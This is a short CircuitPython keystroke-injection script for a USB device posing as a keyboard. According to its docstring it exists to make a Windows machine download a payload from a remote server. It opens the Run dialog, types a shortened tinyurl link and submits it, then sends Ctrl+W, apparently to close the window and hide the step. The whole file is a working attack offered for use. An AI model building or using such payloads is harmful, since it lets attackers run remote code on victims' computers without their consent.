'''
This payload is intended to download a payload from a remote server through the 
windows run command. This file can be a secondary payload.
'''

import time
import usb_hid
import os



from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS


time.sleep(5)
keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)


time.sleep(3)

keyboard.send(Keycode.WINDOWS, Keycode.R)


time.sleep(0.5)
layout.write("https://tinyurl.com/3kbb9mpt\n")


time.sleep(1)
keyboard.send(Keycode.CONTROL, Keycode.W)